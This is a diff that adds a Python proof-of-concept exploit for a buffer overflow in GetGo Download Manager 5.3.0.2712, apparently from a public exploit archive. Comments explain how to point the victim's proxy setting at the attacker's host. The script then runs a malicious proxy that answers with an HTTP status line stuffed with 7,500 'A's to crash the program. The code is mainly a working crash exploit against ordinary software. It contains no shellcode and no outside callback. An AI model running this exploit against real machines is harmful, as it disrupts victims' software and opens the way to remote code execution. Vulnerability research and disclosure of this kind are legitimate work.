@@ -1,0 +1,47 @@
+ # Exploit Title: Buffer overflow vulnerability in GetGo Download Manager proxy options 5.3.0.2712
+# Date: 01-02-2018
+# Tested on Windows 8 64 bits 
+# Exploit Author: devcoinfet
+# Contact: https://twitter.com/wabefet
+# Software Link: http://www.getgosoft.com/getgodm/ 
+# Category: webapps
+# Attack Type: Remote
+# Impact: Code Execution 
+ 
+#to be vulnerable victim must have a  proxy selected that will maliciously return data in response
+#select proxy ip of host running this script incase You  have vm running the software
+#set port of proxy on getgo under proxy settings as well now when you download any page
+#or any file the program incorrectly parses the response and passes request to malicious host triggering overlfow
+
+default_evilbuffer = "A" * 7500
+
+def main():
+    ip = "10.10.10.6"
+    port = 8055
+    fuzz_test(ip,default_evilbuffer,port)
+    
+def fuzz_test(ip,payload,port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((ip, port))
+    s.listen(1)
+    print "\n[+] Listening on %d ..." % port
+ 
+    cl, addr = s.accept()
+    print "[+] Connection accepted from %s" % addr[0]
+    print "[+] Pushing fuzz test to %s" % addr[0]
+ 
+    buffer = "HTTP/1.1 200 " + payload + "\r\n"
+ 
+    print cl.recv(1000)
+    cl.send(buffer)
+    print "[+] Sending Fuzzed buffer From Mailicious Proxy: OK\n"
+    print "[+] Payload type Default Buffer of 7500 A's"
+ 
+    sleep(3)
+    cl.close()
+    s.close()
+ 
+if __name__ == '__main__':
+    import socket
+    from time import sleep
+    main()
